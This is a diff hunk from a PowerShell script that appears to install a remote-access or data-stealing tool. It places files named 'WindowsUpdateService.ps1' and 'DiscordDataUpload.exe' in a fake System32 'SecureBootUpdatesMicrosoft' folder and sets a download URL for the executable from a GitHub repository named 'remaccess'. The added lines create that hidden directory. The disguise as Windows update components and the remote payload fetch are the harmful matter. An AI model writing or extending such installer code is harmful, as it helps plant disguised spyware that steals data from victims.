@@ -7,6 +7,9 @@ $userNames = '"' + $userNamesClean + '"'
 $exepath =  "C:/Windows/System32/SecureBootUpdatesMicrosoft/DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
+if (-not (Test-Path $shellScriptPath)) {
+    New-Item -Path $shellScriptPath -ItemType Directory -Force | Out-Null
+}
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force
 }
